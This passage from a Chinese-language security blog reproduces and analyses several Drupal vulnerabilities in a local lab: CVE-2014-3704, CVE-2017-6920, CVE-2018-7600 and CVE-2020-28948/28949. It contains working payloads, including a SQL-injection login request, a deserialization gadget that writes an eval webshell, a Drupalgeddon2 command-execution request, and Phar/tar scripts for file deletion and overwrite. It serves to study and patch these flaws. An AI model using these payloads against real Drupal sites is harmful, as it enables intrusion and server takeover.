class="line">https://www.drupal.org/project/drupal/releases/7.31</span><br></pre></td></tr></table></figure><p>使用MAMP Pro搭建站点后，更改数据库的相关配置：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201127141314.png" alt=""></p><p>访问本地IP:8080端口，使用默认安装配置即可。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201127132647.png" alt=""></p><p>验证安装成功：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201127140826.png" alt=""></p><p>在不登录的情况下，验证payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;?q&#x3D;node&amp;destination&#x3D;node HTTP&#x2F;1.1</span><br><span class="line">Host: your-ip:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 120</span><br><span class="line"></span><br><span class="line">pass&#x3D;lol&amp;form_build_id&#x3D;&amp;form_id&#x3D;user_login_block&amp;op&#x3D;Log+in&amp;name[0 or updatexml(0,concat(0xa,user()),0)%23]&#x3D;bob&amp;name[0]&#x3D;a</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201127140938.png" alt=""></p><h3 id="漏洞分析">漏洞分析</h3><p>我们可以从上面这张图中看出，漏洞的触发点是在user.module文件中的<code>user_login_authenticate_validate()</code>这个函数。</p><p>下断点调试，查看函数调用栈：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201201231923.png" alt=""></p><p>这个函数在2149行对准备将提交的name参数进行SQL语句拼接：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201201232302.png" alt=""></p><p>继续跟进<code>db_query</code>函数，此时payload存储在args数组中</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201201232615.png" alt=""></p><p>调用<code>query()</code>函数，在这个函数中，继续调用<code>expandArguments</code>进行实质的SQL语句拼接</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201128161036.png" alt=""></p><p>此时query已经是拼接后的SQL语句</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201128161432.png" alt=""></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201128161523.png" alt=""></p><p>最后执行SQL</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201128161630.png" alt=""></p><p>在mysql monitor工具中可以看到具体的执行语句</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201128161715.png" alt=""></p><h2 id="CVE-2017-6920-反序列化任意代码执行漏洞">CVE-2017-6920 反序列化任意代码执行漏洞</h2><h3 id="影响版本-v2">影响版本</h3><p>Drupal 8 &lt; 8.3.3</p><h3 id="环境安装-v2">环境安装</h3><p>从官网中下载Durpal 8.3.0版本的源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.drupal.org&#x2F;project&#x2F;drupal&#x2F;releases&#x2F;8.3.0</span><br></pre></td></tr></table></figure><p>使用MAMP Pro集成环境搭建，更改php.ini配置，打开Yaml扩展：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202130359.png" alt=""></p><p>查看PHPINFO验证是否开启Yaml扩展：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202130431.png" alt=""></p><p>必须在配置文件中启用yaml.decode_php，否则无法复现成功。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yaml.decode_php &#x3D; 1</span><br></pre></td></tr></table></figure><ol><li><p>登录管理员账号</p></li><li><p>访问<code>http://127.0.0.1:8080/admin/config/development/configuration/single/import</code></p></li><li><p>POC：<code>!php/object &quot;O:24:\&quot;GuzzleHttp\\Psr7\\FnStream\&quot;:2:&#123;s:33:\&quot;\0GuzzleHttp\\Psr7\\FnStream\0methods\&quot;;a:1:&#123;s:5:\&quot;close\&quot;;s:7:\&quot;phpinfo\&quot;;&#125;s:9:\&quot;_fn_close\&quot;;s:7:\&quot;phpinfo\&quot;;&#125;&quot;</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202130726.png" alt=""></p></li></ol><p>成功执行phpinfo</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202133316.png" alt=""></p><h3 id="漏洞分析-v2">漏洞分析</h3><p>查看官方的commit记录可以发现漏洞的触发点：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202133822.png" alt=""></p><p>可以看到8.3.4版本的decode函数新增了一段代码，其作用主要就是改变PHP配置文件中的<code>yaml.decode_php=0</code>，那么我们就跟进这个文件：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202134115.png" alt=""></p><p>漏洞所在函数<code>decode</code>的触发点代码就是上图中调用<code>yaml_parse</code>这个函数，其中<code>$raw</code>参数直接被带入<code>yaml_parse</code>函数中，看一下官方文档对于这个函数的描述：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202134255.png" alt=""></p><p>第一个参数是需要parse成yaml的文档流，并且这个参数是从这个函数外部输入的。另外，在官方文档的下方有一个对这个函数的特别说明：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202134439.png" alt=""></p><p>意思就是如果使用了<code>!php/object</code>tag，yaml_parse会对第一个参数调用unserialize()，如果要禁止这样做，就通过设置<code>yaml.decode_php</code>来处理，这就是官方补丁在<code>decode</code>函数前面加的那几行代码。</p><p>因此，这个远程代码执行漏洞的罪魁祸首就是<code>yaml_parse</code>函数可能会用反序列化的形式来处理输入的字符串，从而导致通过反序列化类的方式来操作一些危险类，最终实现代码执行。</p><p>那么控制decode函数的参数<code>$raw</code>就可以出发这个漏洞。回溯定位<code>decode</code>函数的调用位置，在<code>core/lib/Drupal/Component/Serialization/Yaml.php</code>文件中</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202135144.png" alt=""></p><p>在第34行该函数调用了getSerializer函数，跟进到第48行，首先判断是否存在yaml扩展，如果存在的话就使用<code>YamlPecl</code>类，然后调用这个类中的<code>decode</code>函数，也就是会调用<code>yaml_parse</code>函数。</p><p>继续回溯调用<code>Yaml::decode</code>函数的地方，全局查找一共有36处地方：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202140845.png" alt=""></p><p>其中外部可控的地方只有一处，位于<code>ConfigSingleImportForm.php</code>文件中。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202141142.png" alt=""></p><p>这里对外部输入的import值进行<code>Yaml::decode</code>操作，那么这就是漏洞的数据触发点。</p><p>既然是反序列化，那么就需要找到一个可以反序列化的类。全局搜索<code>__destruct</code>或<code>__wakeup</code>关键字，一般而言<code>__destruct</code>更容易利用。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202141427.png" alt=""></p><ol><li><p><code>/vendor/guzzlehttp/guzzle/src/Cookie/FileCookieJar.php</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202143842.png" alt=""></p><p>通过反序列化这个类可以造成写入webshell，但是利用过程相比后面两个而言更为麻烦一点。PHPGGC已经包含了这个gadget，拿过来稍微改一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">GuzzleHttp</span>\<span class="title">Cookie</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="title">class</span> <span class="title">SetCookie</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="title">private</span> $<span class="title">data</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$data</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;data = [</span><br><span class="line">        <span class="string">&#x27;Name&#x27;</span> =&gt; <span class="string">&#x27;ca01h&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Value&#x27;</span> =&gt; <span class="string">&#x27;ca01h&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Expires&#x27;</span> =&gt; <span class="number">1</span>,</span><br><span class="line">        <span class="string">&#x27;Discard&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&#x27;Domain&#x27;</span> =&gt; $data</span><br><span class="line">      ];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">CookieJar</span></span></span><br><span class="line"><span class="class">  </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $cookies = [];</span><br><span class="line">    <span class="keyword">private</span> $strictMode;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$data</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;cookies = [<span class="keyword">new</span> SetCookie($data)];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">FileCookieJar</span> <span class="keyword">extends</span> <span class="title">CookieJar</span></span></span><br><span class="line"><span class="class">  </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $filename;</span><br><span class="line">    <span class="keyword">private</span> $storeSessionCookies = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$filename, $data</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="built_in">parent</span>::__construct($data);</span><br><span class="line">      <span class="keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  $new = <span class="keyword">new</span> FileCookieJar(<span class="string">&#x27;/Users/ca01h/Desktop/shell.php&#x27;</span>, <span class="string">&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;!php/object &#x27;</span> . <span class="string">&#x27;&quot;&#x27;</span> . addslashes(serialize($new)) . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>/vendor/symfony/process/Pipes/WindowsPipes.php</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202161528.png" alt=""></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202161558.png" alt=""></p><p>反序列化这个类可以造成任意文件删除。</p></li><li><p><code>/vendor/guzzlehttp/psr7/src/FnStream.php</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202161812.png" alt=""></p><p>反序列化这个类可以实现无参数RCE。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">GuzzleHttp</span>\<span class="title">Psr7</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="title">class</span> <span class="title">FnStream</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="title">private</span> $<span class="title">methods</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="keyword">array</span> $methods</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;methods = $methods;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Create the functions on the class</span></span><br><span class="line">      <span class="keyword">foreach</span> ($methods <span class="keyword">as</span> $name =&gt; $fn) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;&#123;<span class="string">&#x27;_fn_&#x27;</span> . $name&#125; = $fn;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $new = <span class="keyword">new</span> FnStream(<span class="keyword">array</span>(<span class="string">&quot;close&quot;</span> =&gt; <span class="string">&quot;phpinfo()&quot;</span>));</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;!php/object &#x27;</span> . <span class="string">&#x27;&quot;&#x27;</span> . addslashes(serialize($new)) . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="CVE-2018-7600-远程命令执行漏洞">CVE-2018-7600 远程命令执行漏洞</h2><h3 id="影响版本-v3">影响版本</h3><p>Drupal 7 &lt; 7.58</p><p>Drupal 8.3.x &lt; 8.3.9</p><p>Drupal 8.4.x &lt; 8.4.6</p><p>Drupal 8.5.x &lt; 8.5.1</p><h3 id="环境安装-v3">环境安装</h3><p>从官网中下载Durpal 8.5.0版本的源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.drupal.org&#x2F;project&#x2F;drupal&#x2F;releases&#x2F;8.5.0</span><br></pre></td></tr></table></figure><p>使用MAMP Pro搭建，成功安装后，在不登录的情况下发送如下数据包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;user&#x2F;register?element_parents&#x3D;account&#x2F;mail&#x2F;%23value&amp;ajax_form&#x3D;1&amp;_wrapper_format&#x3D;drupal_ajax HTTP&#x2F;1.1</span><br><span class="line">Host: your-ip:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 103</span><br><span class="line"></span><br><span class="line">form_id&#x3D;user_register_form&amp;_drupal_ajax&#x3D;1&amp;mail[#post_render][]&#x3D;exec&amp;mail[#type]&#x3D;markup&amp;mail[#markup]&#x3D;id</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202210038.png" alt=""></p><h3 id="漏洞分析-v3">漏洞分析</h3><p><a href="https://research.checkpoint.com/2018/uncovering-drupalgeddon-2/">https://research.checkpoint.com/2018/uncovering-drupalgeddon-2/</a></p><p><a href="http://blog.nsfocus.net/cve-2018-7600-drupal-7-x/">http://blog.nsfocus.net/cve-2018-7600-drupal-7-x/</a></p><p><a href="http://blog.topsec.com.cn/%e5%85%b3%e4%ba%8edrupal8%e7%b3%bb%e5%88%97%e6%a1%86%e6%9e%b6%e5%92%8c%e6%bc%8f%e6%b4%9e%e5%8a%a8%e6%80%81%e8%b0%83%e8%af%95%e6%b7%b1%e5%85%a5%e5%88%86%e6%9e%90/">http://blog.topsec.com.cn/关于drupal8系列框架和漏洞动态调试深入分析/</a></p><h2 id="CVE-2018-7602-远程命令执行漏洞">CVE-2018-7602 远程命令执行漏洞</h2><p><a href="http://blog.nsfocus.net/cve-2018-7602-drupal/">http://blog.nsfocus.net/cve-2018-7602-drupal/</a></p><h2 id="CVE-2019-6339-远程代码执行漏洞">CVE-2019-6339 远程代码执行漏洞</h2><p><a href="https://paper.seebug.org/897/">https://paper.seebug.org/897/</a></p><h2 id="CVE-2019-6341-1-click-XSS">CVE-2019-6341 1-click XSS</h2><h2 id="CVE-2020-28948-28949-远程代码执行漏洞-任意文件覆盖漏洞">CVE-2020-28948/28949 远程代码执行漏洞/任意文件覆盖漏洞</h2><h3 id="影响版本-v4">影响版本</h3><p>Drupal 9 &lt; 9.0.9</p><p>Drupal 8.9 &lt; 8.9.10</p><p>Drupal 8.8 &lt; 8.8.12</p><p>Drupal 8.x (x≠8)</p><p>Drupal 7 &lt; 7.75</p><h3 id="漏洞分析-v4">漏洞分析</h3><p>先查看Drupal官方发的漏洞通报：</p><p><a href="https://www.drupal.org/sa-core-2020-013">https://www.drupal.org/sa-core-2020-013</a></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201209143410.png" alt=""></p><p>通报中提到，Drupal使用了Archive_Tar第三方PEAR组件，而这个组件最近发布了一版安全更新，那么就先去官方仓库上看看Drupal是怎么修复这个漏洞的。以Drupal 8.9版本为例：</p><p><a href="https://git.drupalcode.org/project/drupal/-/commit/1a9383ed9010af01608a5481ad443eb72c1bea7e">https://git.drupalcode.org/project/drupal/-/commit/1a9383ed9010af01608a5481ad443eb72c1bea7e</a></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201209144007.png" alt=""></p><p>可以很明显的看到，Drupal将Archive_tar的版本从1.4.9升级到1.4.11。所以这个漏洞的源头并不是Drupal代码出了问题，而是第三方组件Archive_tar存在缺陷。那我们就主要分析一下Archive_tar的漏洞成因，同样的，去这个组件的GitHub仓库看两个版本的差异点。</p><p><a href="https://github.com/pear/Archive_Tar/compare/1.4.9...1.4.11">https://github.com/pear/Archive_Tar/compare/1.4.9...1.4.11</a></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201209144432.png" alt=""></p><p>左边是1.4.9版本的代码，右边是1.4.11版本的代码，漏洞的源头就是在于<code>_maliciousFilename</code>函数中。</p><p>作者为了防止反序列化漏洞，过滤了<code>phar://</code>关键字，但明显strpos这种简单的过滤还是太年轻了，可以很容易地用大写来绕过<code>PHAR://exploit.phar</code>，从而导致反序列化漏洞的产生，这就是CVE-2020-28948漏洞的根源。同样CVE-2020-28949漏洞的根源也在这个地方，我们可以使用<code>file://path/to/file/to/be/overwritten</code>协议作为文件名，从而导致文件覆盖的漏洞。</p><p>Archive_tar组件也很简单，就一个PHP文件，具体的漏洞成因我们审计这一个文件即可。</p><p>一共也就两个地方用到了<code>_maliciousfilename</code>这个函数，一个是<code>_readHeader</code>函数，另一个是<code>_readLongHeader</code>函数。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201209150851.png" alt=""></p><p>而从上图可以看到，在<code>_readLongHeader</code>函数中，还是调用了<code>_readHeader</code>函数，所以我们主要分析<code>_readHeader</code>这个函数。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201209152216.png" alt=""></p><p>这个函数比较长，但是通读下来，发现就做了一件事情，读取压缩文件的头部信息，这些信息包括<code>checksum</code>、<code>property</code>，其中<code>property</code>包含了<code>filename</code>、<code>mode</code>、<code>uid</code>、<code>gid</code>、<code>size</code>等等字段，将这些信息存储在<code>$v_header</code>中并返回到上一级函数，那么我们就进行回溯工作，看有哪些地方调用了<code>_readHeader</code>这个函数。</p><p>全局查找后，发现一共有三个地方，分别是<code>_readLongHeader</code>、<code>_extractList</code>和<code>_extractInString</code>，后两个函数对比一下就可以发现，<code>_extractList</code>是一个较为完整的解压缩过程，那从这里开始分析肯定是没错的。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201209153149.png" alt=""></p><p>在1989行调用了<code>readHeader</code>函数，在我们跟踪<code>$v_header['filename']</code>参数之前，由于函数传参较多，而且参数会很大程度上影响程序流程，所以我们调研一下Archive_tar组件使用方法后发现，解压缩主要是用到<code>extract</code>这个函数。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201210143209.png" alt=""></p><p>继续跟进<code>extractModify</code>函数</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201210143245.png" alt=""></p><p>在574行调用了<code>_extractList</code>函数，进入上述所说的实质性解压操作。</p><p>根据上图的参数，正常程序流程会进入到2049行的if语句中，并且不会进入到2050行和2062行的if语句中。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201210143940.png" alt=""></p><p>接下来在执行2075行的if语句时，调用了<code>file_exsits</code>函数，参数是原本<code>$v_header['filename']</code>的值，此时如果这个值是<code>PHAR://exploit.phar</code>，并且当前文件夹上传了expliot.phar文件，那么就会触发反序列化漏洞。</p><p>既然是反序列化操作，那么就需要全局搜索<code>__destruct</code>或者<code>__wakeup</code>函数。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201210144655.png" alt=""></p><p>全局搜索析构函数后，继续跟进<code>_close</code>函数</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201210144758.png" alt=""></p><p>在该函数的最后一部分，当<code>_temp_tarname</code>不为空的时候，会调用<code>unlink</code>删除文件函数，那么这个地方就可以触发任意文件删除的漏洞了。</p><p>分析完漏洞成因后，接下来就是编写漏洞利用的脚本了。首先新建一个<code>ca01h_test</code>的文件，内容随意，接下来编写生成Phar文件的PHP代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;phar.readonly&#x27;</span>,<span class="string">&#x27;Off&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Archive_Tar</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> $_temp_tarname;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$_temp_tarname</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_temp_tarname = $_temp_tarname;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&#x27;exploit.phar&#x27;</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;text&#x27;</span>);</span><br><span class="line">$phar-&gt;setStub(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>);</span><br><span class="line">$tar = <span class="keyword">new</span> Archive_Tar(<span class="string">&#x27;ca01h_test&#x27;</span>);</span><br><span class="line">$phar-&gt;setMetadata($tar);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>然后再编写python脚本生成一个压缩文件，其中被压缩的文件名是<code>PHAR://exploit.phar</code>，input_file.txt文件内容随意：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line">tar = tarfile.open(<span class="string">&#x27;exploit.tar&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">tar.add(<span class="string">&#x27;input_file.txt&#x27;</span>, <span class="string">&#x27;PHAR://exploit.phar&#x27;</span>)</span><br><span class="line">tar.close()</span><br></pre></td></tr></table></figure><p>最后编写触发漏洞的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">require_once</span>(<span class="string">&#x27;../Archive/Tar.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  $archive = <span class="keyword">new</span> Archive_Tar(<span class="string">&#x27;exploit.tar&#x27;</span>);</span><br><span class="line">  $archive-&gt;extract();</span><br></pre></td></tr></table></figure><p>运行上面代码后，可以发现<code>ca01h_test</code>文件被删除。</p><p>接下来再讨论一下CVE-2020-28948，产生漏洞的原因同时是因为过滤不严，只是触发漏洞的位置不一样而言。<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201210152508.png" alt=""></p><p>程序在第2151行或2158行调用了<code>fwrite</code>函数，将从压缩文件读出来的文件内容写入到<code>$v_header[filename]</code>文件中，那么这个地方就可能造成任意文件覆盖的漏洞。流程如下：</p><p>首先生成一个测试文件，内容随意：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;test&quot;</span> &gt; /tmp/target_file</span><br></pre></td></tr></table></figure><p>再用python脚本生成带有恶意payload文件名的压缩文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line">tar = tarfile.open(<span class="string">&#x27;exploit.tar&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">tar.add(<span class="string">&#x27;input_file.txt&#x27;</span>, <span class="string">&#x27;file:///tmp/target_file&#x27;</span>)</span><br><span class="line">tar.close()</span><br></pre></td></tr></table></figure><p>最后执行同样的漏洞触发代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">require_once</span>(<span class="string">&#x27;../Archive/Tar.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  $archive = <span class="keyword">new</span> Archive_Tar(<span class="string">&#x27;exploit.tar&#x27;</span>);</span><br><span class="line">  $archive-&gt;extract();</span><br></pre></td></tr></table></figure><h2 id="参考">参考</h2><p><a href="https://github.com/vulhub/vulhub/tree/master/drupal">https://github.com/vulhub/vulhub/tree/master/drupal</a></p><p><a href="https://paper.seebug.org/334/">https://paper.seebug.org/334/</a></p><p><a 